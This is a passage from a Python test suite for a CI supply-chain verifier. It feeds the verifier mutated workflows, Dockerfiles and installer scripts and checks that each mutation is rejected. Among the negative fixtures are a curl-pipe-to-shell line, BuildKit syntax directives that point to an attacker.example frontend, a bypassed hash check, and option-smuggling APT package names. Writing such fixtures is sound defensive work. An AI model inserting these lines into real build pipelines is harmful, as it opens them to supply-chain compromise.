            ),
            (
                "second-build-action",
                "      - name: Attest exact temporary OCI subject\n",
                (
                    "      - name: Unexpected second Buildx action\n"
                    f"        uses: {build_action} # v6\n"
                    "        with:\n"
                    "          context: .\n"
                    "          push: true\n"
                    "          tags: ghcr.io/example/ci:second\n\n"
                    "      - name: Attest exact temporary OCI subject\n"
                ),
            ),
            (
                "pre-suite-latest-write",
                "      - name: Attest exact temporary OCI subject\n",
                (
                    "      - name: Premature latest write\n"
                    "        run: docker buildx imagetools create --tag "
                    "ghcr.io/example/ci:latest ghcr.io/example/ci@sha256:deadbeef\n\n"
                    "      - name: Attest exact temporary OCI subject\n"
                ),
            ),
            (
                "buildkit-syntax-argument",
                "          build-args: |\n",
                (
                    "          build-args: |\n"
                    "            BUILDKIT_SYNTAX=attacker/frontend:latest\n"
                ),
            ),
            (
                "apt-snapshot-argument",
                "          build-args: |\n",
                (
                    "          build-args: |\n"
                    "            APT_SNAPSHOT=19700101T000000Z\n"
                ),
            ),
            (
                "verifier-continue-on-error",
                "        run: python3 ci/scripts/ci_lock_verify.py\n",
                (
                    "        run: python3 ci/scripts/ci_lock_verify.py\n"
                    "        continue-on-error: true\n"
                ),
            ),
            (
                "conditional-build",
                "        id: push\n",
                "        id: push\n        if: always()\n",
            ),
            (
                "build-extra-environment",
                f"        uses: {build_action} # v6\n",
                (
                    f"        uses: {build_action} # v6\n"
                    "        env:\n"
                    "          APT_SNAPSHOT: 19700101T000000Z\n"
                ),
            ),
            (
                "build-does-not-push",
                "          push: true\n",
                "          push: false\n",
            ),
            (
                "additional-tag",
                "          tags: ${{ steps.caller.outputs.temporary_image }}\n",
                (
                    "          tags: |\n"
                    "            ${{ steps.caller.outputs.temporary_image }}\n"
                    "            ghcr.io/example/ci:latest\n"
                ),
            ),
            (
                "builder-runtime-not-retained",
                '            --output "$CI_RUNNER_IDENTITY_FILE"\n',
                "",
            ),
            (
                "manifest-uses-no-builder-runtime",
                '            --builder-runner-identity "${{ runner.temp }}/photospider-builder-runner-${{ github.run_id }}-${{ github.run_attempt }}.json" \\\n',
                "",
            ),
            (
                "image-omits-builder-version-label",
                "            org.photospider.ci.builder-image-version=${{ steps.builder.outputs.image_version }}\n",
                "",
            ),
            (
                "workflow-call-input-downgrade",
                "        required: true\n",
                "        required: false\n",
            ),
            (
                "producer-package-permission-downgrade",
                "  packages: write\n",
                "  packages: read\n",
            ),
            (
                "additional-job",
                "          retention-days: 7\n",
                (
                    "          retention-days: 7\n"
                    "  shadow-build:\n"
                    "    runs-on: ubuntu-24.04\n"
                    "    steps:\n"
                    "      - run: docker buildx build .\n"
                ),
            ),
        )
        for label, original, replacement in cases:
            with self.subTest(
                producer_drift=label
            ), tempfile.TemporaryDirectory() as temporary_text:
                self.assertEqual(producer.count(original), 1)
                root = Path(temporary_text)
                workflow_root = root / ".github/workflows"
                workflow_root.mkdir(parents=True)
                (workflow_root / "build-ci-image.yml").write_text(
                    producer.replace(original, replacement, 1), encoding="utf-8"
                )
                with self.assertRaises(module.ContractError) as raised:
                    module._verify_ci_image_producer(root, actions)
                self.assertIn(
                    "complete CI-image producer mapping differs",
                    str(raised.exception),
                )

    def test_runner_identity_handoffs_reject_path_and_environment_drift(self) -> None:
        """Reject missing outputs, split paths, candidate paths, and env rereads."""
        module = self._load_lock_module()
        module._verify_runner_identity_handoffs(REPO_ROOT)
        workflows = {
            name: (REPO_ROOT / f".github/workflows/{name}").read_text(
                encoding="utf-8"
            )
            for name in (
                "ci-healthcheck.yml",
                "ci-sanitizer.yml",
            )
        }
        platform_reader = (SCRIPTS / "security_platform_prepare.sh").read_text(
            encoding="utf-8"
        )
        cases = (
            (
                "missing-manual-output",
                "ci-sanitizer.yml",
                "sanitizer",
                '          --output "$CI_RUNNER_IDENTITY_FILE"\n',
                "",
                "manual sanitizer host/container mapping differs",
            ),
            (
                "split-manual-consumer-path",
                "ci-sanitizer.yml",
                "sanitizer",
                "          CI_RUNNER_IDENTITY_FILE: ${{ runner.temp }}/photospider-manual-sanitizer-runner-${{ github.run_id }}-${{ github.run_attempt }}.json\n          CI_RUNNER_TEMP: ${{ runner.temp }}\n",
                "          CI_RUNNER_IDENTITY_FILE: ${{ runner.temp }}/forged-other.json\n          CI_RUNNER_TEMP: ${{ runner.temp }}\n",
                "manual sanitizer host/container mapping differs",
            ),
            (
                "candidate-manual-output-path",
                "ci-sanitizer.yml",
                "sanitizer",
                "      - name: Verify exact Linux sanitizer runner\n        env:\n          CI_RUNNER_IDENTITY_FILE: ${{ runner.temp }}/photospider-manual-sanitizer-runner-${{ github.run_id }}-${{ github.run_attempt }}.json\n        run: >-\n",
                "      - name: Verify exact Linux sanitizer runner\n        env:\n          CI_RUNNER_IDENTITY_FILE: ${{ inputs.checkout_ref }}\n        run: >-\n",
                "manual sanitizer host/container mapping differs",
            ),
        )
        for label, filename, job_name, original, replacement, diagnostic in cases:
            with self.subTest(identity_handoff_drift=label), tempfile.TemporaryDirectory() as text:
                root = Path(text)
                workflow_root = root / ".github/workflows"
                script_root = root / "ci/scripts"
                lock_root = root / "ci/locks"
                workflow_root.mkdir(parents=True)
                script_root.mkdir(parents=True)
                lock_root.mkdir(parents=True)
                shutil.copy2(
                    REPO_ROOT / "ci/locks/actions.lock",
                    lock_root / "actions.lock",
                )
                for current_name, current_text in workflows.items():
                    if current_name == filename:
                        current_text = self._replace_workflow_job_fragment(
                            current_text, job_name, original, replacement
                        )
                    (workflow_root / current_name).write_text(
                        current_text, encoding="utf-8"
                    )
                (script_root / "security_platform_prepare.sh").write_text(
                    platform_reader, encoding="utf-8"
                )
                with self.assertRaises(module.ContractError) as raised:
                    module._verify_runner_identity_handoffs(root)
                self.assertIn(diagnostic, str(raised.exception))

        with tempfile.TemporaryDirectory() as text:
            root = Path(text)
            workflow_root = root / ".github/workflows"
            script_root = root / "ci/scripts"
            lock_root = root / "ci/locks"
            workflow_root.mkdir(parents=True)
            script_root.mkdir(parents=True)
            lock_root.mkdir(parents=True)
            shutil.copy2(
                REPO_ROOT / "ci/locks/actions.lock",
                lock_root / "actions.lock",
            )
            for filename, value in workflows.items():
                (workflow_root / filename).write_text(value, encoding="utf-8")
            (script_root / "security_platform_prepare.sh").write_text(
                platform_reader + '\necho "${ImageVersion:-}"\n', encoding="utf-8"
            )
            with self.assertRaises(module.ContractError) as raised:
                module._verify_runner_identity_handoffs(root)
            self.assertIn("reinterprets mutable runner state", str(raised.exception))

    def test_package_lock_names_and_apt_argv_are_option_safe(self) -> None:
        """Require Debian package names and positional post-``--`` APT argv."""
        module = self._load_lock_module()
        module._verify_packages(
            REPO_ROOT / "ci/locks/ubuntu-24.04-packages.lock"
        )
        positive_rows = sorted(
            ("aa=1", "ca-certificates=1", "openssl=1"),
            key=lambda value: value.encode("utf-8"),
        )
        with tempfile.TemporaryDirectory() as temporary_text:
            package_path = Path(temporary_text) / "packages.lock"
            package_path.write_text("\n".join(positive_rows) + "\n", encoding="utf-8")
            self.assertEqual(
                module._verify_packages(package_path),
                {"aa": "1", "ca-certificates": "1", "openssl": "1"},
            )

        invalid_tokens = (
            "--allow-unauthenticated=true",
            "-ofoo=1",
            ".hidden=1",
            "-hidden=1",
            "a=1",
        )
        for token in invalid_tokens:
            with self.subTest(
                invalid_package_token=token
            ), tempfile.TemporaryDirectory() as temporary_text:
                package_path = Path(temporary_text) / "packages.lock"
                rows = sorted(
                    (token, "ca-certificates=1", "openssl=1"),
                    key=lambda value: value.encode("utf-8"),
                )
                package_path.write_text("\n".join(rows) + "\n", encoding="utf-8")
                with self.assertRaises(module.ContractError) as raised:
                    module._verify_packages(package_path)
                self.assertIn("invalid exact package lock", str(raised.exception))

        with tempfile.TemporaryDirectory() as temporary_text:
            root = Path(temporary_text)
            shim = root / "apt_argv.py"
            shim.write_text(
                "import json\nimport sys\nprint(json.dumps(sys.argv[1:]))\n",
                encoding="utf-8",
            )
            completed = subprocess.run(
                [
                    "xargs",
                    sys.executable,
                    str(shim),
                    "install",
                    "-y",
                    "--no-install-recommends",
                    "--",
                ],
                input="normal-package\nname=version\n",
                text=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                check=True,
            )
            self.assertEqual(
                json.loads(completed.stdout),
                [
                    "install",
                    "-y",
                    "--no-install-recommends",
                    "--",
                    "normal-package",
                    "name=version",
                ],
            )

    def test_buildkit_unicode_space_predicate_and_marker_boundary(self) -> None:
        """Match Go White_Space exactly without widening the marker boundary.

        The table covers every code point accepted by Go ``unicode.IsSpace``
        and adjacent/non-Go controls that Python ``str.isspace`` may accept.
        Directive recognition is also anchored to a byte-zero comment marker.
        """
        module = self._load_lock_module()
        go_white_space = {
            0x0009,
            0x000A,
            0x000B,
            0x000C,
            0x000D,
            0x0020,
            0x0085,
            0x00A0,
            0x1680,
            *range(0x2000, 0x200B),
            0x2028,
            0x2029,
            0x202F,
            0x205F,
            0x3000,
        }
        for code_point in sorted(go_white_space):
            with self.subTest(go_white_space=f"U+{code_point:04X}"):
                self.assertTrue(module._go_unicode_is_space(chr(code_point)))

        non_go_space = (
            0x0008,
            0x000E,
            0x001C,
            0x001D,
            0x001E,
            0x001F,
            0x0084,
            0x0086,
            0x009F,
            0x00A1,
            0x167F,
            0x1681,
            0x1FFF,
            0x200B,
            0x2027,
            0x202A,
            0x202E,
            0x2030,
            0x205E,
            0x2060,
            0x2FFF,
            0x3001,
        )
        for code_point in non_go_space:
            with self.subTest(non_go_space=f"U+{code_point:04X}"):
                self.assertFalse(module._go_unicode_is_space(chr(code_point)))

        with self.assertRaises(module.ContractError):
            module._go_unicode_is_space("")
        with self.assertRaises(module.ContractError):
            module._go_unicode_is_space("  ")

        frontend = "attacker.example/frontend:latest"
        for prefix in (" ", "\t"):
            with self.subTest(marker_leading_space=repr(prefix)):
                self.assertIsNone(
                    module._buildkit_syntax_directive(
                        f"{prefix}# syntax={frontend}\nFROM scratch\n"
                    )
                )

    def test_dockerfile_physical_lines_follow_go_scan_lines(self) -> None:
        """Keep frontend and active parsing on one LF-only line authority.

        Normal LF/CRLF input, a terminal CR, and CRLF continuations remain
        valid. Every non-LF separator stays inside the preceding comment token,
        so it cannot expose the canonical installer ``RUN`` to the verifier
        when BuildKit would still treat that text as comment content.
        """
        module = self._load_lock_module()
        self.assertEqual(module._go_scan_lines(""), [])
        self.assertEqual(module._go_scan_lines("\n"), [""])
        self.assertEqual(
            module._go_scan_lines("alpha\r\nbeta\r"), ["alpha", "beta"]
        )
        self.assertEqual(
            module._go_scan_lines("RUN one \\\r\n    two\r"),
            ["RUN one \\", "    two"],
        )

        dockerfile = (REPO_ROOT / "Dockerfile.ci").read_text(encoding="utf-8")
        image_lock_value = json.loads(
            (REPO_ROOT / "ci/locks/ci-image-lock.json").read_text(encoding="utf-8")
        )
        package_lock = (
            REPO_ROOT / "ci/locks/ubuntu-24.04-packages.lock"
        ).read_text(encoding="utf-8")
        snapshot_source = (
            REPO_ROOT / "ci/locks/ubuntu-24.04-snapshot.sources.in"
        ).read_text(encoding="utf-8")
        installer = (REPO_ROOT / "ci/scripts/ci_image_install.sh").read_text(
            encoding="utf-8"
        )
        suite_gate = (
            REPO_ROOT / "ci/scripts/integration_suite_gate.py"
        ).read_text(encoding="utf-8")

        valid_newline_forms = (
            ("lf", dockerfile),
            ("crlf", dockerfile.replace("\n", "\r\n")),
            ("terminal-cr", dockerfile.removesuffix("\n") + "\r"),
        )
        for label, valid_dockerfile in valid_newline_forms:
            with self.subTest(
                valid_dockerfile_lines=label
            ), tempfile.TemporaryDirectory() as temporary_text:
                root = Path(temporary_text)
                self._write_image_fixture(
                    root,
                    dockerfile=valid_dockerfile,
                    image_lock=image_lock_value,
                    package_lock=package_lock,
                    snapshot_source=snapshot_source,
                    installer=installer,
                    suite_gate=suite_gate,
                )
                module._verify_dockerfile(root)

        comment = (
            "# Docker invokes it once; its full bytes and active statement "
            "stream are locked."
        )
        installer_run = "RUN bash /tmp/ci-image-install.sh"
        canonical_boundary = f"{comment}\n{installer_run}"
        self.assertEqual(dockerfile.count(canonical_boundary), 1)
        non_lf_separators = (
            ("cr-only", "\r"),
            ("vertical-tab", "\u000b"),
            ("form-feed", "\u000c"),
            ("file-separator", "\u001c"),
            ("group-separator", "\u001d"),
            ("record-separator", "\u001e"),
            ("next-line", "\u0085"),
            ("line-separator", "\u2028"),
            ("paragraph-separator", "\u2029"),
            ("unit-separator-adjacent", "\u001f"),
        )
        for label, separator in non_lf_separators:
            with self.subTest(
                non_lf_separator=label
            ), tempfile.TemporaryDirectory() as temporary_text:
                joined_line = f"{comment}{separator}{installer_run}"
                self.assertEqual(module._go_scan_lines(joined_line), [joined_line])
                mutated_dockerfile = dockerfile.replace(
                    canonical_boundary, joined_line, 1
                )
                root = Path(temporary_text)
                self._write_image_fixture(
                    root,
                    dockerfile=mutated_dockerfile,
                    image_lock=image_lock_value,
                    package_lock=package_lock,
                    snapshot_source=snapshot_source,
                    installer=installer,
                    suite_gate=suite_gate,
                )
                with self.assertRaises(module.ContractError) as raised:
                    module._verify_dockerfile(root)
                self.assertIn(
                    "canonical active instruction stream differs",
                    str(raised.exception),
                )

    def test_image_installer_and_docker_surface_reject_every_drift(self) -> None:
        """Reject every unapproved Docker/helper command and lock mutation.

        The frontend fixtures model BuildKit's BOM and first-line shebang
        preprocessing without resolving any declared frontend. This keeps the
        regression deterministic and ensures the reviewer reproduction reaches
        syntax detection rather than being hidden by the shebang comment.
        """
        module = self._load_lock_module()
        module._verify_dockerfile(REPO_ROOT)
        dockerfile = (REPO_ROOT / "Dockerfile.ci").read_text(encoding="utf-8")
        image_lock_value = json.loads(
            (REPO_ROOT / "ci/locks/ci-image-lock.json").read_text(encoding="utf-8")
        )
        package_lock = (
            REPO_ROOT / "ci/locks/ubuntu-24.04-packages.lock"
        ).read_text(encoding="utf-8")
        snapshot_source = (
            REPO_ROOT / "ci/locks/ubuntu-24.04-snapshot.sources.in"
        ).read_text(encoding="utf-8")
        installer = (REPO_ROOT / "ci/scripts/ci_image_install.sh").read_text(
            encoding="utf-8"
        )
        suite_gate = (
            REPO_ROOT / "ci/scripts/integration_suite_gate.py"
        ).read_text(encoding="utf-8")
        bootstrap = image_lock_value["apt_bootstrap"]
        bootstrap_hash = bootstrap["ca_certificates"]["sha256"]
        bootstrap_url = bootstrap["ca_certificates"]["url"]
        snapshot = image_lock_value["apt_snapshot"]
        openssl_version = bootstrap["openssl"]["version"]
        cases = (
            (
                "docker-does-not-call-installer",
                "dockerfile",
                "RUN bash /tmp/ci-image-install.sh\n",
                "RUN true\n",
                "canonical active instruction stream differs",
            ),
            (
                "docker-comment-forges-installer-call",
                "dockerfile",
                "RUN bash /tmp/ci-image-install.sh\n",
                "# RUN bash /tmp/ci-image-install.sh\nRUN true\n",
                "canonical active instruction stream differs",
            ),
            (
                "bootstrap-hash-drift",
                "dockerfile",
                bootstrap_hash,
                "0" * 64,
                "canonical active instruction stream differs",
            ),
            (
                "extra-unhashed-remote-add",
                "dockerfile",
                "# The minimal Ubuntu base has no TLS trust bundle.",
                (
                    "ADD https://snapshot.ubuntu.com/ubuntu/20260825T000000Z/"
                    "pool/main/c/ca-certificates/ca-certificates_"
                    "20260601~24.04.1_all.deb /tmp/unknown.deb\n\n"
                    "# The minimal Ubuntu base has no TLS trust bundle."
                ),
                "canonical active instruction stream differs",
            ),
            (
                "commented-locked-from-active-alpine",
                "dockerfile",
                (
                    "FROM ubuntu:24.04@sha256:"
                    "33ceb71981b602c1a7443a53469e4dba065f7503eab3078a2d7a57a2ab987517\n"
                ),
                (
                    "# FROM ubuntu:24.04@sha256:"
                    "33ceb71981b602c1a7443a53469e4dba065f7503eab3078a2d7a57a2ab987517\n"
                    "FROM alpine:3.22\n"
                ),
                "canonical active instruction stream differs",
            ),
            (
                "bootstrap-version-differs-from-package-lock",
                "package-lock",
                f"openssl={openssl_version}",
                f"openssl={openssl_version}.mismatch",
                "OpenSSL bootstrap version differs from the package lock",
            ),
            (
                "bootstrap-snapshot-url-drift",
                "image-lock-url",
                bootstrap_url,
                bootstrap_url.replace(f"/{snapshot}/", "/19700101T000000Z/"),
                "CA bootstrap URL is not the locked snapshot package",
            ),
            (
                "snapshot-template-omitted-from-image-manifest",
                "image-lock-input",
                "ci/locks/ubuntu-24.04-snapshot.sources.in",
                "",
                "canonical APT source is absent from image inputs",
            ),
            (
                "snapshot-template-live-host",
                "snapshot-source",
                "https://snapshot.ubuntu.com/ubuntu/@APT_SNAPSHOT@/",
                "http://ports.ubuntu.com/ubuntu-ports/",
                "canonical signed snapshot source differs",
            ),
        )
        for label, owner, original, replacement, diagnostic in cases:
            with self.subTest(
                image_contract_drift=label
            ), tempfile.TemporaryDirectory() as temporary_text:
                root = Path(temporary_text)
                mutated_dockerfile = dockerfile
                mutated_image_lock = json.loads(json.dumps(image_lock_value))
                mutated_package_lock = package_lock
                mutated_snapshot_source = snapshot_source
                if owner == "dockerfile":
                    self.assertEqual(mutated_dockerfile.count(original), 1)
                    mutated_dockerfile = mutated_dockerfile.replace(
                        original, replacement, 1
                    )
                elif owner == "package-lock":
                    self.assertEqual(mutated_package_lock.count(original), 1)
                    mutated_package_lock = mutated_package_lock.replace(
                        original, replacement, 1
                    )
                elif owner == "snapshot-source":
                    self.assertEqual(mutated_snapshot_source.count(original), 1)
                    mutated_snapshot_source = mutated_snapshot_source.replace(
                        original, replacement, 1
                    )
                elif owner == "image-lock-url":
                    encoded = json.dumps(mutated_image_lock)
                    self.assertEqual(encoded.count(original), 1)
                    mutated_image_lock = json.loads(
                        encoded.replace(original, replacement, 1)
                    )
                elif owner == "image-lock-input":
                    paths = mutated_image_lock["input_paths"]
                    self.assertEqual(paths.count(original), 1)
                    paths.remove(original)
                else:
                    raise AssertionError(f"unknown image fixture owner: {owner}")
                self._write_image_fixture(
                    root,
                    dockerfile=mutated_dockerfile,
                    image_lock=mutated_image_lock,
                    package_lock=mutated_package_lock,
                    snapshot_source=mutated_snapshot_source,
                    installer=installer,
                    suite_gate=suite_gate,
                )
                with self.assertRaises(module.ContractError) as raised:
                    if label == "snapshot-template-omitted-from-image-manifest":
                        actions = module._read_actions(root / "ci/locks/actions.lock")
                        module._verify_image_lock(root, actions)
                    else:
                        module._verify_dockerfile(root)
                self.assertIn(diagnostic, str(raised.exception))

        installer_mutations = (
            (
                "absolute-apt-before-source",
                "  sed \"s/@APT_SNAPSHOT@/$APT_SNAPSHOT/g\" \\\n",
                "  /usr/bin/apt-get update\n"
                "  sed \"s/@APT_SNAPSHOT@/$APT_SNAPSHOT/g\" \\\n",
            ),
            (
                "extra-curl-pipe-shell",
                "  curl --fail --location --proto '=https' --tlsv1.2 \\\n",
                "  curl https://example.invalid/install | sh\n"
                "  curl --fail --location --proto '=https' --tlsv1.2 \\\n",
            ),
            (
                "github-cli-hash-check-bypassed",
                "    | sha256sum --check --strict -\n",
                "    | true\n",
            ),
            (
                "github-cli-url-drift",
                "https://github.com/cli/cli/releases/download/",
                "https://example.invalid/cli/",
            ),
            (
                "early-success-exit",
                "  sed \"s/@APT_SNAPSHOT@/$APT_SNAPSHOT/g\" \\\n",
                "  exit 0\n"
                "  sed \"s/@APT_SNAPSHOT@/$APT_SNAPSHOT/g\" \\\n",
            ),
            (
                "required-main-not-called",
                'ci_image_install_main "$@"\n',
                ":\n",
            ),
            (
                "comment-forges-apt",
                "  apt-get update\n",
                "  # apt-get update\n  :\n",
            ),
        )
        for label, original, replacement in installer_mutations:
            with self.subTest(
                installer_semantic_drift=label
            ), tempfile.TemporaryDirectory() as temporary_text:
                self.assertEqual(installer.count(original), 1)
                mutated_installer = installer.replace(original, replacement, 1)
                rebound_lock = self._rebind_helper_hash(
                    image_lock_value, "ci-image-installer", mutated_installer
                )
                root = Path(temporary_text)
                self._write_image_fixture(
                    root,
                    dockerfile=dockerfile,
                    image_lock=rebound_lock,
                    package_lock=package_lock,
                    snapshot_source=snapshot_source,
                    installer=mutated_installer,
                    suite_gate=suite_gate,
                )
                with self.assertRaises(module.ContractError) as raised:
                    module._verify_dockerfile(root)
                self.assertIn(
                    "installer active statement identity differs",
                    str(raised.exception),
                )

        suite_helper_mutations = (
            (
                "gate-noop",
                '    for job_name, variable in REQUIRED_RESULTS:\n',
                '    return environment.get("CI_IMAGE_DIGEST", "")\n'
                '    for job_name, variable in REQUIRED_RESULTS:\n',
            ),
            (
                "gate-early-success",
                "    arguments = build_parser().parse_args()\n",
                "    return 0\n"
                "    arguments = build_parser().parse_args()\n",
            ),
            (
                "gate-extra-statement",
                "    arguments = build_parser().parse_args()\n",
                "    print('unexpected gate statement')\n"
                "    arguments = build_parser().parse_args()\n",
            ),
        )
        for label, original, replacement in suite_helper_mutations:
            with self.subTest(
                suite_helper_semantic_drift=label
            ), tempfile.TemporaryDirectory() as temporary_text:
                self.assertEqual(suite_gate.count(original), 1)
                mutated_gate = suite_gate.replace(original, replacement, 1)
                rebound_lock = self._rebind_helper_hash(
                    image_lock_value, "integration-suite-gate", mutated_gate
                )
                root = Path(temporary_text)
                self._write_image_fixture(
                    root,
                    dockerfile=dockerfile,
                    image_lock=rebound_lock,
                    package_lock=package_lock,
                    snapshot_source=snapshot_source,
                    installer=installer,
                    suite_gate=mutated_gate,
                )
                with self.assertRaises(module.ContractError) as raised:
                    module._verify_dockerfile(root)
                self.assertIn(
                    "suite-gate verifier-owned source identity differs",
                    str(raised.exception),
                )

        with tempfile.TemporaryDirectory() as temporary_text:
            root = Path(temporary_text)
            mutated_gate = suite_gate + "# unreviewed source-byte drift\n"
            self._write_image_fixture(
                root,
                dockerfile=dockerfile,
                image_lock=image_lock_value,
                package_lock=package_lock,
                snapshot_source=snapshot_source,
                installer=installer,
                suite_gate=mutated_gate,
            )
            with self.assertRaises(module.ContractError) as raised:
                module._verify_dockerfile(root)
            self.assertIn(
                "protected helper 'integration-suite-gate' bytes differ from the lock",
                str(raised.exception),
            )

        with tempfile.TemporaryDirectory() as temporary_text:
            root = Path(temporary_text)
            mutated_installer = installer + "# comment-only byte drift\n"
            self._write_image_fixture(
                root,
                dockerfile=dockerfile,
                image_lock=image_lock_value,
                package_lock=package_lock,
                snapshot_source=snapshot_source,
                installer=mutated_installer,
                suite_gate=suite_gate,
            )
            with self.assertRaises(module.ContractError) as raised:
                module._verify_dockerfile(root)
            self.assertIn("bytes differ from the lock", str(raised.exception))

        syntax_directives = (
            "# syntax=attacker.example/frontend:latest\n",
            (
                "# syntax=attacker.example/frontend@sha256:"
                + "0" * 64
                + "\n"
            ),
            "# SyNtAx = attacker.example/frontend:latest\n",
            "#\tsyntax= attacker.example/frontend:latest\n",
            "#\u0085syntax=attacker.example/frontend:latest\n",
            "#\u00a0syntax=attacker.example/frontend:latest\n",
            "#\u2003syntax=attacker.example/frontend:latest\n",
            "#\u200asyntax=attacker.example/frontend:latest\n",
            "#\u2028syntax=attacker.example/frontend:latest\n",
            "#\u2029syntax=attacker.example/frontend:latest\n",
            "#\u202fsyntax=attacker.example/frontend:latest\n",
            "#\u3000syntax=attacker.example/frontend:latest\n",
            "# syntax=attacker.example/frontend:latest --frontend-opt\n",
            "// syntax=attacker.example/frontend:latest\n",
        )
        for directive in syntax_directives:
            with self.subTest(
                forbidden_syntax_directive=directive.encode(
                    "unicode_escape"
                ).decode("ascii")
            ), tempfile.TemporaryDirectory() as temporary_text:
                root = Path(temporary_text)
                self._write_image_fixture(
                    root,
                    dockerfile=directive + dockerfile,
                    image_lock=image_lock_value,
                    package_lock=package_lock,
                    snapshot_source=snapshot_source,
                    installer=installer,
                    suite_gate=suite_gate,
                )
                with self.assertRaises(module.ContractError) as raised:
                    module._verify_dockerfile(root)
                self.assertIn(
                    "Docker syntax parser directive is forbidden",
                    str(raised.exception),
                )

        with tempfile.TemporaryDirectory() as temporary_text:
            root = Path(temporary_text)
            self._write_image_fixture(
                root,
                dockerfile=(
                    json.dumps(
                        {"syntax": "attacker.example/frontend:latest"},
                        sort_keys=True,
                    )
                    + "\n"
                ),
                image_lock=image_lock_value,
                package_lock=package_lock,
                snapshot_source=snapshot_source,
                installer=installer,
                suite_gate=suite_gate,
            )
            with self.assertRaises(module.ContractError) as raised:
                module._verify_dockerfile(root)
            self.assertIn(
                "Docker syntax parser directive is forbidden",
                str(raised.exception),
            )

        utf8_bom = bytes((0xEF, 0xBB, 0xBF))
        frontend = "attacker.example/frontend:latest"
        preamble_cases = (
            (
                "first-line-shebang",
                b"#!/bin/sh\n",
                "first-line Dockerfile shebang is forbidden",
                False,
            ),
            (
                "reviewer-shebang-syntax",
                f"#!/bin/sh\n# syntax={frontend}\n".encode(),
                "Docker syntax parser directive is forbidden",
                True,
            ),
            (
                "utf8-bom",
                utf8_bom,
                "UTF-8 BOM is forbidden",
                False,
            ),
            (
                "utf8-bom-syntax",
                utf8_bom + f"# syntax={frontend}\n".encode(),
                "UTF-8 BOM is forbidden",
                True,
            ),
            (
                "utf8-bom-shebang-syntax",
                utf8_bom + f"#!/bin/sh\n# syntax={frontend}\n".encode(),
                "UTF-8 BOM is forbidden",
                True,
            ),
        )
        for label, preamble, diagnostic, syntax_expected in preamble_cases:
            with self.subTest(
                docker_frontend_preamble=label
            ), tempfile.TemporaryDirectory() as temporary_text:
                detector_source = (preamble + dockerfile.encode()).decode("utf-8")
                detected = module._buildkit_syntax_directive(detector_source)
                self.assertEqual(detected is not None, syntax_expected)
                if detected is not None:
                    self.assertEqual(detected[0], frontend)
                root = Path(temporary_text)
                self._write_image_fixture(
                    root,
                    dockerfile=dockerfile,
                    image_lock=image_lock_value,
                    package_lock=package_lock,
                    snapshot_source=snapshot_source,
                    installer=installer,
                    suite_gate=suite_gate,
                )
                (root / "Dockerfile.ci").write_bytes(
                    preamble + dockerfile.encode()
                )
                with self.assertRaises(module.ContractError) as raised:
                    module._verify_dockerfile(root)
                self.assertIn(diagnostic, str(raised.exception))

        allowed_escape_directives = (
            "# escape=" + "\\" + "\n\n",
            "# EsCaPe = " + "\\" + "\n\n",
            "#\tescape=\t" + "\\" + "\n\n",
        )
        for directive in allowed_escape_directives:
            with self.subTest(
                allowed_escape_directive=directive.rstrip()
            ), tempfile.TemporaryDirectory() as temporary_text:
                root = Path(temporary_text)
                self._write_image_fixture(
                    root,
                    dockerfile=directive + dockerfile,
                    image_lock=image_lock_value,
                    package_lock=package_lock,
                    snapshot_source=snapshot_source,
                    installer=installer,
                    suite_gate=suite_gate,
                )
                module._verify_dockerfile(root)

        with tempfile.TemporaryDirectory() as temporary_text:
            root = Path(temporary_text)
            self._write_image_fixture(
                root,
                dockerfile="# escape=`\n\n" + dockerfile,
                image_lock=image_lock_value,
                package_lock=package_lock,
                snapshot_source=snapshot_source,
                installer=installer,
                suite_gate=suite_gate,
            )
            with self.assertRaises(module.ContractError) as raised:
                module._verify_dockerfile(root)
            self.assertIn(
                "unsupported Docker escape directive", str(raised.exception)
            )

        non_active_frontend_comments = (
            " # syntax=attacker.example/frontend:latest\n",
            "\t# syntax=attacker.example/frontend:latest\n",
            "# syntax is discussed here, not selected\n",
        )
        for comment in non_active_frontend_comments:
            with self.subTest(
                non_active_frontend_comment=comment.encode(
                    "unicode_escape"
                ).decode("ascii")
            ), tempfile.TemporaryDirectory() as temporary_text:
                self.assertIsNone(
                    module._buildkit_syntax_directive(comment + dockerfile)
                )
                root = Path(temporary_text)
                self._write_image_fixture(
                    root,
                    dockerfile=comment + dockerfile,
                    image_lock=image_lock_value,
                    package_lock=package_lock,
                    snapshot_source=snapshot_source,
                    installer=installer,
                    suite_gate=suite_gate,
                )
                module._verify_dockerfile(root)

    def test_linux_security_jobs_keep_host_identity_before_candidate_container(self) -> None:
        """Reject job containers, reordered host checks, or mutable image inputs.

        Returns:
            None after the complete structured workflow verifier accepts the
            production three-sibling mapping and rejects each boundary drift.

        Raises:
            AssertionError: One Linux profile can inherit a container-host
                identity, receive candidate data before verification, omit the
                Bash boundary, or consume a non-exact image reference.
        """
        module = self._load_lock_module()
        module._verify_linux_security_dag(REPO_ROOT)
        workflow_path = REPO_ROOT / ".github/workflows/ci-integration-suite.yml"
        workflow = workflow_path.read_text(encoding="utf-8")
        cases = (
            (
                "job-container",
                "sanitizer-asan",
                "    runs-on: ubuntu-24.04\n    timeout-minutes: 90\n",
                "    runs-on: ubuntu-24.04\n    container: ubuntu:latest\n    timeout-minutes: 90\n",
            ),
            (
                "candidate-before-identity",
                "sanitizer-asan",
                "Checkout Linux ASan candidate after host verification",
                "Checkout Linux ASan candidate before host verification",
            ),
            (
                "partial-protected-profile-control",
                "sanitizer-asan",
                "            ci/scripts\n",
                (
                    "            ci/scripts/ci_runner_verify.py\n"
                    "            ci/scripts/linux_security_profile.sh\n"
                ),
            ),
            (
                "missing-bash-shell",
                "sanitizer-asan",
                "      - name: Run isolated ASan profile in the exact image\n        shell: bash\n",
                "      - name: Run isolated ASan profile in the exact image\n",
            ),
            (
                "mutable-image-input",
                "sanitizer-asan",
                "          CI_IMAGE_REF: ${{ inputs.image_ref }}\n",
                "          CI_IMAGE_REF: ghcr.io/example/photospider-ci:latest\n",
            ),
            (
                "sibling-dependency",
                "sanitizer-tsan",
                "    needs: integration-plan\n",
                "    needs: sanitizer-asan\n",
            ),
        )
        for label, job_name, old, new in cases:
            with self.subTest(linux_dag_drift=label), tempfile.TemporaryDirectory() as text:
                root = Path(text)
                target_workflow = root / ".github/workflows/ci-integration-suite.yml"
                target_workflow.parent.mkdir(parents=True)
                target_workflow.write_text(
                    self._replace_workflow_job_fragment(
                        workflow, job_name, old, new
                    ),
                    encoding="utf-8",
                )
                (root / "ci/locks").mkdir(parents=True)
                shutil.copy2(
                    REPO_ROOT / "ci/locks/actions.lock",
                    root / "ci/locks/actions.lock",
                )
